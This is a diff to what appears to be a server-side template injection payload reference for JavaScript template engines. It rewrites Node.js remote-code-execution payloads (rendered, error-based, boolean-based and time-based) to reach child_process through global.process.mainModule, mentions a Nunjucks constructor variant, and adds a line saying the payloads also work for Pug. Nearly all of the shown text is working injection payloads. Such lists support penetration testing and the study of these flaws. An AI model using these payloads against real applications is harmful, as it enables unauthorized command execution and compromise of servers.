@@ -41,17 +41,17 @@ To use these payloads, wrap them in the appropriate tag.
 
 ```javascript
 // Rendered RCE
-require("child_process").execSync("id")
+global.process.mainModule.require("child_process").execSync("id")
 
 // Error-Based RCE
-require("Y:/A:/"+require("child_process").execSync("id"))
-""["x"][require("child_process").execSync("id")]
+global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id"))
+""["x"][global.process.mainModule.require("child_process").execSync("id")]
 
 // Boolean-Based RCE
-[""][0 + !(require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]
+[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]
 
 // Time-Based RCE
-require("child_process").execSync("id && sleep 5")
+global.process.mainModule.require("child_process").execSync("id && sleep 5")
 ```
 
 NunjucksJS is also capable of executing these payloads using `{{range.constructor(' ... ')()}}`.
@@ -148,6 +148,8 @@ ${= _.VERSION}
 ---
 
 ## Pug
+
+> Universal payloads also work for Pug.
 
 [Official website](https://pugjs.org/api/getting-started.html)
 >
